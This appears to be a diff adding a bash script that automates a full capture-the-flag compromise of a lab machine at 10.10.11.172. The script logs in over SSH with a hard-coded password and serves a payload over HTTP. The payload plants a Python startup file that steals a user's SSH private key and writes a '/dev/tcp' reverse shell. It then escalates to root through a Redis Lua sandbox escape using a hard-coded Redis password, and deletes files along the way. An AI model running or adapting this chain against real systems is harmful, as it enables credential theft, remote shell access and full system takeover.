@@ -1,0 +1,39 @@
+#!/bin/bash
+trap ctrl_c 2
+ctrl_c(){ kill -TERM $psp $psn 2>/dev/null;exit;}
+tun=$(ifconfig 2>/dev/null|grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'|grep -v 255|grep -v 127|head -n 1)
+command -v ncat >/dev/null || apt install nmap-ncat -y
+command -v ssh >/dev/null || apt install openssb -y
+command -v sshpass >/dev/null || apt install sshpass -y
+
+cat <<- CONF > ${TMPDIR}/CCA.sh
+#!/bin/sh
+cd /opt/scripts_review/
+mkdir -m 777 /opt/scripts_review/profile_default
+mkdir -m 777 /opt/scripts_review/profile_default/startup
+echo 'import os;os.system("cat ~/.ssh/id_rsa > /dev/shm/key")' > profile_default/startup/foo.py
+echo "Getting dan_smith id_rsa"
+until [ -e /dev/shm/key ]; do
+        continue
+done
+echo "cat ~/user.txt" | ssh dan_smith@127.0.0.1 -i /dev/shm/key > res.txt
+echo "echo 'bash -i >& /dev/tcp/$tun/4433 0>&1' > /dev/shm/sh" | ssh dan_smith@127.0.0.1 -i /dev/shm/key
+echo -en "\e[33mUSER FLAG : \$(tail -n 1 res.txt) \e[0m\n"
+echo "eval 'local l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = l(); local f = io.popen(\"cat /dev/shm/sh | bash\"); local res = f:read(\"*a\"); f:close(); return res' 0" | ssh dan_smith@127.0.0.1 -i /dev/shm/key redis-cli --pass F2WHqJUz2WEz=Gqq 2>/dev/null
+CONF
+
+cd ${TMPDIR}
+python -m http.server 8080 &
+psp=$(echo $!)
+echo 'echo -en "\e[31mROOT FLAG: $(cat /root/root.txt)\e[0m\n"'|ncat -nlvp 4433 &
+psn=$(echo $!)
+echo "Soleil101" > ${TMPDIR}/logfile.ssh
+sshpass -f ${TMPDIR}/logfile.ssh ssh james_mason@10.10.11.172 "rm -rf ~/*;wget http://$tun:8080/CCA.sh;bash CCA.sh"
+rm -rf ${TMPDIR}/*
+
+while [ "$(ps a|awk '{print $1}'|grep $psn)" ]; do
+  echo -en "press \e[31mENTER\e[0m to end"
+  read enter;break
+done
+
+ctrl_c
